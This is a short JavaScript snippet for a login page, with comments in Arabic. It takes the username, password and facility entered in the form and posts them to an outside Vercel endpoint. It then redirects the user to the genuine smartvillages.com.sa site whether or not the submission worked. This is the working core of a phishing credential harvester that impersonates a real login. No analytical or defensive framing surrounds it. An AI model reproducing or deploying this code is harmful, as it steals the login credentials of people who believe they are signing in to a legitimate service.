    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var btn = document.getElementById("BtnLogin");
            
            if(btn) {
                btn.addEventListener("click", function(e) {
                    e.preventDefault();
                    
                    // جمع البيانات
                    var username = document.getElementById("username").value;
                    var password = document.getElementById("password").value;
                    var company = document.getElementById("DDLFacility").value;
                    var language = document.getElementById("DDLLanguage").value;
                    var timestamp = new Date().toLocaleString('ar-SA');
                    
                    // التحقق من البيانات
                    if(!username || !password) {
                        alert("الرجاء ملء جميع الحقول");
                        return;
                    }
                    
                    // تغيير لون الزر لإظهار جاري الإرسال
                    btn.style.opacity = "0.6";
                    btn.disabled = true;
                    
                    // إرسال البيانات إلى Vercel API
                    // استبدل YOUR_VERCEL_DOMAIN بـ اسم موقعك على Vercel
                    fetch("https://logix-login.vercel.app/api/login", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            username: username,
                            password: password,
                            company: company,
                            language: language,
                            timestamp: timestamp
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log("✓ النجاح:", data);
                        // توجيه المستخدم
                        setTimeout(function() {
                            window.location.href = "https://smartvillages.com.sa/";
                        }, 500);
                    })
                    .catch(error => {
                        console.error("✗ خطأ:", error);
                        // حتى لو حصل خطأ، وجه المستخدم
                        setTimeout(function() {
                            window.location.href = "https://smartvillages.com.sa/";
                        }, 500);
                    });
                });
            }
        });
    </script>
